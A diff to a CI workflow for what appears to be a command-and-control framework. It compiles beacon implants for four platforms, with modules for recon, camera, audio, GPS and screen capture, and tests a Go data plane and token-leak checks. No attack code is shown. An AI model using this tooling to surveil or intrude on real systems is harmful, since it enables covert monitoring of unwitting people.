@@ -143,51 +143,199 @@ jobs:
       - name: Install OpenSSL headers on macOS
         if: runner.os == 'macOS'
         run: brew install openssl@3
-      - name: Compile beacon translation unit without generated secrets
+      - name: Set up Python (the generators need it)
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - name: Install Python deps (header generators import Phantom)
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements-dev.txt
+          pip install -r requirements.txt
+      - name: Generate the REAL build headers (never a hand-written stub)
+        # The same generators the release build uses: a drift in a generated
+        # header — a renamed macro, a malformed array, a new required define —
+        # then fails HERE instead of only on an operator's machine.
         shell: bash
         run: |
-          python - <<'PY'
-          from pathlib import Path
-          p = Path('phantom/payloads/beacon/src/beacon_auth.h')
-          p.write_text('''#pragma once
-          #define BEACON_AUTH_ENABLED 1
-          #define BEACON_MTLS_ENABLED 1
-          #define BEACON_AUTH_ID "CI-BEACON"
-          #define BEACON_SERVER_FINGERPRINT "0000000000000000000000000000000000000000000000000000000000000000"
-          static const unsigned char BEACON_AUTH_SECRET[32] = {0};
-          static const char BEACON_CLIENT_CERT_PEM[] = "";
-          static const char BEACON_CLIENT_KEY_PEM[] = "";
-          static const char BEACON_CLIENT_CA_PEM[] = "";
-          static const unsigned char BEACON_CLIENT_PFX[] = {0};
-          static const unsigned long BEACON_CLIENT_PFX_LEN = 1;
-          ''')
-          PY
+          python scripts/ci_beacon_prepare.py --dir phantom/payloads/beacon --ci-identity
+          python scripts/ci_beacon_prepare.py --dir phantom/payloads/remote --ci-identity
+      - name: Compile beacon AND remote translation units (warnings are errors)
+        shell: bash
+        run: |
+          # -Werror on a CURATED set: the WinAPI noise (`#pragma comment`,
+          # partial Win32 struct init, FARPROC casts) is suppressed, every
+          # other warning fails the job. Linux and Windows were verified
+          # warning-free with exactly these flags; macOS also tolerates an
+          # unknown warning option so a clang version skew cannot break it.
           if [[ "$RUNNER_OS" == "macOS" ]]; then
             CXX=clang++
             CPPFLAGS="-I$(brew --prefix openssl@3)/include"
+            WARNS="-Wall -Wextra -Werror -Wno-unknown-pragmas -Wno-missing-field-initializers -Wno-cast-function-type -Wno-unknown-warning-option"
           else
             CXX=g++
             CPPFLAGS=""
+            WARNS="-Wall -Wextra -Werror -Wno-unknown-pragmas -Wno-missing-field-initializers -Wno-cast-function-type"
           fi
-          $CXX -std=c++20 -fsyntax-only $CPPFLAGS -Iphantom/payloads/beacon/src phantom/payloads/beacon/src/main.cpp
-          rm -f phantom/payloads/beacon/src/beacon_auth.h
+          # The remote module carries its OWN copy of crypto.h and the
+          # transport: exactly the kind of duplication that drifts silently.
+          $CXX -std=c++20 -fsyntax-only $WARNS $CPPFLAGS -Iphantom/payloads/beacon/src phantom/payloads/beacon/src/main.cpp
+          $CXX -std=c++20 -fsyntax-only $WARNS $CPPFLAGS -Iphantom/payloads/remote/src phantom/payloads/remote/src/main.cpp
+
+  beacon-smoke:
+    runs-on: ubuntu-latest
+    needs: lint-and-test
+    steps:
+      - uses: actions/checkout@v4
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - name: Install deps and C++ toolchain
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements-dev.txt
+          pip install -r requirements.txt
+          sudo apt-get update && sudo apt-get install -y \
+            g++ libssl-dev zlib1g-dev libzstd-dev
+      - name: Compile the beacon through the RELEASE path
+        # the real build function the release uses, not a hand-rolled
+        # command: a break in the generated headers, the flags or the link
+        # fails here instead of at an engagement. The canary token is set so
+        # the NEXT step can prove it never reaches the binary.
+        env:
+          PHANTOM_PAYLOAD_TOKEN: phantom-canary-deployment-token
+        run: python scripts/ci_beacon_smoke.py --platform linux --require
+      - name: The built binary carries no deployment payload token
+        # An enrolled build derives its own download token at runtime; if the
+        # deployment-wide token ever leaks in, one captured beacon unlocks
+        # every payload, forever.
+        run: |
+          python scripts/ci_beacon_token_scan.py \
+            --artefact phantom/payloads/beacon/beacon_linux \
+            --token phantom-canary-deployment-token
+
+  beacon-smoke-windows:
+    # A Windows build is NOT a variant of the Linux one: it uses BCrypt
+    # instead of OpenSSL, GNU as for the stub/syscall objects and a different
+    # linker shape. It has to be built here or it is never built.
+    runs-on: windows-latest
+    needs: lint-and-test
+    steps:
+      - uses: actions/checkout@v4
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - name: Install MinGW (g++ AND as)
+        shell: powershell
+        run: choco install mingw -y --no-progress
+      - name: Install Python deps
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements-dev.txt
+          pip install -r requirements.txt
+      - name: Compile the beacon for Windows (release path)
+        shell: bash
+        run: python scripts/ci_beacon_smoke.py --platform windows --require
+
+  beacon-smoke-macos:
+    # Native clang++ on a real Mac: osxcross only exists to cross-compile FROM
+    # Linux, and demanding it on macOS made the platform unbuildable there.
+    runs-on: macos-latest
+    needs: lint-and-test
+    steps:
+      - uses: actions/checkout@v4
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - name: Install OpenSSL (Homebrew's is keg-only)
+        run: brew install openssl@3
+      - name: Install Python deps
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements-dev.txt
+          pip install -r requirements.txt
+      - name: Compile the beacon for macOS (release path)
+        shell: bash
+        run: python scripts/ci_beacon_smoke.py --platform macos --require
+
+  beacon-smoke-android:
+    # The NDK does not ship OpenSSL; the build helper cross-compiles it into
+    # the NDK sysroot on first use. That is exactly what runs here, so a real
+    # aarch64 payload is produced — an honest failure if any link of that
+    # chain breaks.
+    runs-on: ubuntu-latest
+    needs: lint-and-test
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v4
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - name: Install Python deps and build tools (OpenSSL bootstrap needs them)
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements-dev.txt
+          pip install -r requirements.txt
+          sudo apt-get update && sudo apt-get install -y build-essential perl
+      - name: Compile the beacon for Android (release path)
+        shell: bash
+        run: |
+          # The runner image ships an NDK under ANDROID_NDK_LATEST_HOME; the
+          # other names are honoured too, exactly like the builder does.
+          export ANDROID_NDK_HOME="${ANDROID_NDK_HOME:-${ANDROID_NDK_LATEST_HOME:-/opt/android-ndk}}"
+          echo "NDK: $ANDROID_NDK_HOME"
+          python scripts/ci_beacon_smoke.py --platform android --require
+
+  c2d-test:
+    # The Go data plane is a SECOND implementation of the wire protocol. It is
+    # only honest to ship it if CI proves it builds, vets and agrees with the
+    # Python side on the key derivation.
+    runs-on: ubuntu-latest
+    needs: lint-and-test
+    steps:
+      - uses: actions/checkout@v4
+      - name: Set up Go
+        uses: actions/setup-go@v5
+        with:
+          go-version: 'stable'
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - name: Install Python deps
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements-dev.txt
+          pip install -r requirements.txt
+      - name: gofmt / vet / test
+        working-directory: c2d
+        run: |
+          set -o pipefail
+          UNFORMATTED=$(gofmt -l .)
+          if [ -n "$UNFORMATTED" ]; then echo "ERROR: gofmt needed for:"; echo "$UNFORMATTED"; exit 1; fi
+          go vet ./...
+          go test ./... -v 2>&1 | tail -40
+      - name: Python <-> Go key derivation parity
+        run: python scripts/c2d_parity_check.py
 
   beacon-lint:
     runs-on: ubuntu-latest
     needs: lint-and-test
     steps:
       - uses: actions/checkout@v4
-      - name: Check beacon source structure
-        run: |
-          echo "Checking beacon source files..."
-          for f in main.cpp crypto.h network.h recon.h screenshot.h media_utils.h gps.h camera.h audio.h screen_record.h; do
-            if [ ! -f "phantom/payloads/beacon/src/$f" ]; then
-              echo "ERROR: Missing beacon source file: $f"
-              exit 1
-            fi
-          done
-          echo "All beacon source files present"
-          echo "Beacon modules: main.cpp + $(ls phantom/payloads/beacon/src/*.h | wc -l) header files"
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - name: Beacon source hygiene
+        # Not a file-existence check: required units, `#pragma once`, generated
+        # headers NOT tracked, no committed build artefacts, no debug prints,
+        # no deployment secret in tracked source.
+        run: python scripts/ci_beacon_lint.py
 
   security-scan:
     runs-on: ubuntu-latest
